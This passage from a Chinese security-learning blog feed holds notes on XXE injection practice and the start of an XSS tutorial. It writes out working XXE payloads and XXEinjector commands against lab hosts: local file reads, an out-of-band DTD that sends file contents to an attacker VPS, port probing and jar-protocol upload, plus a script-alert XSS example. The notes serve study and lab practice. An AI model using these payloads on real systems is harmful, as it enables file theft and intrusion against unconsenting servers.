src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624364014050-ac9cf45a-5547-4461-bbf5-18bd28bd6938.png#align=left&amp;amp;display=inline&amp;amp;height=972&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8B%E5%8D%888.13.10.png&amp;amp;originHeight=972&amp;amp;originWidth=1500&amp;amp;size=257199&amp;amp;status=done&amp;amp;style=none&amp;amp;width=1500&quot; alt=&quot;截屏2021-06-22 下午8.13.10.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;之后就可以打开终端进行注入&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;读取文件内容&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;首先确认，目标服务器中的文件内容如下&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624364140136-64a585dd-2abc-4a15-8fc1-8707c419f132.png#align=left&amp;amp;display=inline&amp;amp;height=140&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8B%E5%8D%888.14.57.png&amp;amp;originHeight=202&amp;amp;originWidth=366&amp;amp;size=30106&amp;amp;status=done&amp;amp;style=none&amp;amp;width=254&quot; alt=&quot;截屏2021-06-22 下午8.14.57.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;之后输入&lt;br &#x2F;&gt;ruby XXEinjector.rb --host=192.168.43.204 --file=java8080.txt --path=c:&#x2F;flag.txt --verbose&lt;br &#x2F;&gt;可以看到已经得到了文件内容&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624364227672-33274ae3-fcd0-47eb-a3c3-5ab2e864b717.png#align=left&amp;amp;display=inline&amp;amp;height=1702&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8B%E5%8D%888.16.44.png&amp;amp;originHeight=1702&amp;amp;originWidth=3016&amp;amp;size=1155719&amp;amp;status=done&amp;amp;style=none&amp;amp;width=3016&quot; alt=&quot;截屏2021-06-22 下午8.16.44.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;若要读取特殊字符，如PHP文件，则应该在后面加上&lt;br &#x2F;&gt;--phpfilter&lt;br &#x2F;&gt;(仅限php环境)&lt;br &#x2F;&gt;ruby XXEinjector.rb --host=192.168.43.204 --file=java8080.txt --path=c:&#x2F;flag.txt --verbose --phpfilter&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;获取服务器的hash&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;这里同上面获取hash的过程一样，无法成功，metasploit这边获取不到…………&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;ol start=&quot;3&quot;&gt;
&lt;li&gt;目录遍历&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;无论是mac本机还是kali虚拟机还是docker下的kali，都无法成功……&lt;&#x2F;p&gt;
&lt;h2 id=&quot;metinfo6-0-0-cmslou-dong-shen-ji&quot;&gt;metinfo6.0.0 cms漏洞审计&lt;&#x2F;h2&gt;
&lt;p&gt;这个以后再补充吧&lt;&#x2F;p&gt;
&lt;h2 id=&quot;xxezong-he-ba-chang-na-flag&quot;&gt;xxe综合靶场拿flag&lt;&#x2F;h2&gt;
&lt;p&gt;这个以后再补充吧&lt;&#x2F;p&gt;
&lt;h1 id=&quot;suo-she-ji-xxedai-ma&quot;&gt;所涉及XXE代码&lt;&#x2F;h1&gt;
&lt;pre data-lang=&quot;xml&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-xml &quot;&gt;&lt;code class=&quot;language-xml&quot; data-lang=&quot;xml&quot;&gt;&lt;span&gt;【试验】PHP语言下的XXE漏洞实战的代码：
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;?&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;xml &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;version&lt;&#x2F;span&gt;&lt;span&gt;=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;1.0&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;?&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;!&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;DOCTYPE &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;user &lt;&#x2F;span&gt;&lt;span&gt;[
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;!&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;ENTITY &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;margin &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;SYSTEM &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;file:&#x2F;&#x2F;&#x2F;c:&#x2F;flag.txt&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;]&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;user&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;username&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;admin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;margin;&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;username&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;password&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;admin&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;password&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;user&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;XXE读取有特殊字符的文件
&lt;&#x2F;span&gt;&lt;span&gt;payload如下
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;?&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;xml &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;version&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;1.0&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;encoding&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;?&amp;gt; 
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;!&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;DOCTYPE &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;roottag &lt;&#x2F;span&gt;&lt;span&gt;[
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;!&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;ENTITY &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;start &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;lt;![&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;CDATA&lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;&amp;gt;   
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;!ENTITY % goodies SYSTEM &amp;quot;file:&#x2F;&#x2F;&#x2F;C:&#x2F;Windows&#x2F;test.txt&amp;quot;&amp;gt;  
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;!ENTITY % end &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;]]&amp;gt;&amp;quot;&amp;gt;  
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;!&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;ENTITY &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;dtd &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;SYSTEM &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;http:&#x2F;&#x2F;127.0.0.1:83&#x2F;evil.dtd&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;gt; 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;%dtd; 
&lt;&#x2F;span&gt;&lt;span&gt;]&amp;gt; 
&lt;&#x2F;span&gt;&lt;span&gt;evil.dtd文件内容
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;?&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;xml &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;version&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;1.0&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;encoding&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;UTF-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;?&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;background-color:#bf616a;color:#2b303b;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;!ENTITY all &amp;quot;%start;%goodies;%end;&amp;quot;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;ENTITY中定义CDATA
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;XXE无回显读取文件
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;?&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;xml &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;version&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;1.0&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;?&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;!&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;DOCTYPE &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;test &lt;&#x2F;span&gt;&lt;span&gt;[
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;!&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;ENTITY &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;file &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;SYSTEM &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;php:&#x2F;&#x2F;filter&#x2F;read=convert.base64-encode&#x2F;resource=d:&#x2F;hacker.txt&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;!&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;ENTITY &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;dtd &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;SYSTEM &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;http:&#x2F;&#x2F;VPS的IP地址&#x2F;evil.xml&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;%dtd;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;%send;
&lt;&#x2F;span&gt;&lt;span&gt;]&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;evil.xml内容
&lt;&#x2F;span&gt;&lt;span style=&quot;background-color:#bf616a;color:#2b303b;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;!ENTITY % payload &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;background-color:#bf616a;color:#2b303b;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;!ENTITY &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;amp;#x&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;25;&lt;&#x2F;span&gt;&lt;span&gt; send SYSTEM &amp;#39;http:&#x2F;&#x2F;VPS的IP地址&#x2F;?content=%file;&amp;#39;&amp;gt;&amp;quot;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;%payload;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;探测端口1
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;?&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;xml &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;version&lt;&#x2F;span&gt;&lt;span&gt;=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;1.0&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;?&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;!&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;DOCTYPE &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;user &lt;&#x2F;span&gt;&lt;span&gt;[
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;!&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;ENTITY &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;dtd &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;SYSTEM &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;http:&#x2F;&#x2F;192.168.0.103&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;]&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;user&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;username&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;admin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;dtd;&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;username&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;password&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;admin&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;password&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;user
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;background-color:#bf616a;color:#2b303b;&quot;&gt;探测端口2&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;?&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;xml &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;version&lt;&#x2F;span&gt;&lt;span&gt;=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;1.0&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;?&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;!&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;DOCTYPE &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;user &lt;&#x2F;span&gt;&lt;span&gt;[
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;!&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;ENTITY &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;file &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;SYSTEM &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;php:&#x2F;&#x2F;filter&#x2F;read=convert.base64-encode&#x2F;resource=http:IP:PORT&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;!&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;ENTITY &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;dtd &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;SYSTEM &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;http:&#x2F;&#x2F;192.168.0.110&#x2F;evil.xml&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;%dtd;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;%send;
&lt;&#x2F;span&gt;&lt;span&gt;]&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;user&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;username&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;admin&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;username&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;password&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;admin&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;password&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;user&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;evil.xml内容
&lt;&#x2F;span&gt;&lt;span style=&quot;background-color:#bf616a;color:#2b303b;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;!ENTITY % payload &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;background-color:#bf616a;color:#2b303b;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;!ENTITY &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;amp;#x&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;25;&lt;&#x2F;span&gt;&lt;span&gt; send SYSTEM &amp;#39;http:&#x2F;&#x2F;VPS的IP地址&#x2F;?content=%file;&amp;#39;&amp;gt;&amp;quot;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;%payload;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;jar协议上传文件
&lt;&#x2F;span&gt;&lt;span&gt;压缩要上传的文件，末尾加入垃圾字符
&lt;&#x2F;span&gt;&lt;span&gt;启动监听：python3 xxe_server xx.zip
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;?&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;xml &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;version&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;1.0&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;?&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;!&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;DOCTYPE &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;user &lt;&#x2F;span&gt;&lt;span&gt;[
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;!&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;ENTITY &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;margin &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;SYSTEM &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;jar:http:&#x2F;&#x2F;192.168.0.100:9999&#x2F;xx.zip!&#x2F;shell.txt&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;]&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;user&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;username&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;margin;&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;username&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;password&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;a&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;password&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;user&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;yi-pian-hao-wen-zhang&quot;&gt;一篇好文章&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.yuque.com&#x2F;attachments&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;pdf&#x2F;2424924&#x2F;1624119577988-3bc0773f-a611-4cff-83b2-cb9cf2c9a930.pdf&quot;&gt;一篇文章带你深入理解漏洞之 XXE 漏洞 - 先知社区.pdf&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>XSS注入</title>
		<published>2021-06-12T00:00:00+00:00</published>
		<updated>2021-06-12T00:00:00+00:00</updated>
		<link href="https://baz.ee/xsszhu-ru/" type="text/html"/>
		<id>https://baz.ee/xsszhu-ru/</id>
		<content type="html">&lt;h1 id=&quot;xsskua-zhan-jiao-ben-gong-ji-ding-yi&quot;&gt;XSS跨站脚本攻击定义&lt;&#x2F;h1&gt;
&lt;p&gt;跨站脚本攻击（Cross Site scripting）是指攻击者利用网站程序对用户&lt;strong&gt;输入过滤不足&lt;&#x2F;strong&gt;，输入可以显示在页面上对其他用户造成影响的HTML和javascript代码，从而&lt;strong&gt;盗取用户资料&lt;&#x2F;strong&gt;、利用某种身份进行某种动作或者对访问者&lt;strong&gt;进行病毒侵害&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
&lt;p&gt;的一种攻击方式。&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623586047182-4b1866b4-d0e2-425a-9b26-952d134e8290.png#align=left&amp;amp;display=inline&amp;amp;height=158&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-13%20%E4%B8%8B%E5%8D%888.07.15.png&amp;amp;originHeight=158&amp;amp;originWidth=730&amp;amp;size=31885&amp;amp;status=done&amp;amp;style=none&amp;amp;width=730&quot; alt=&quot;截屏2021-06-13 下午8.07.15.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;如上代码的主要作用是获取用户输入的参数作为用户名，并在页面中显示“welcome,XXX”的形式。&lt;br &#x2F;&gt;若在URL后输入 ?name=baz 则页面返回 welcome,baz! 若输入 ?name=&lt;script&gt;alert(&#x2F;hack by baz&#x2F;)&lt;script&gt; 则会弹窗 hack by baz 。&lt;&#x2F;p&gt;
&lt;h1 id=&quot;xsslou-dong-fen-lei&quot;&gt;XSS漏洞分类&lt;&#x2F;h1&gt;
&lt;ul&gt;
&lt;li&gt;反射型XSS
&lt;ul&gt;
&lt;li&gt;反射型XSS只是简单地将用户输入的数据直接或未经完善的安全过滤就在浏览器中进行输出，导致输出的数据中存在可被浏览器执行的代码数据。由于此种类型的跨站代码存在于URL中，所以黑客通常需要通过诱骗或加密变形等方式将存在恶意代码的链接发给用户，只有用户点击以后才能使得攻击成功实施。&lt;&#x2F;li&gt;
&lt;li&gt;嵌入iframe（点击劫持、钓鱼等）&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;存储型XSS
&lt;ul&gt;
&lt;li&gt;存储型XSS脚本攻击是指由于web应用程序对用户输入数据过滤的不严格，导致web应用程序将黑客输入恶意跨站攻击数据信息保存在服务端的数据库或其他文件形式中，当网页进行数据查询展示时，会从数据库中获取数据内容，并将数据内容在网页中进行显示，进而导致跨站脚本代码的执行。&lt;&#x2F;li&gt;
&lt;li&gt;存储型XSS脚本攻击最为常见的场景就是在留言板、博客或新闻发布系统中，恶意代码的数据信息直接写入文章、评论、留言中，浏览时会执行相应的脚本代码。&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;DOM型XSS
&lt;ul&gt;
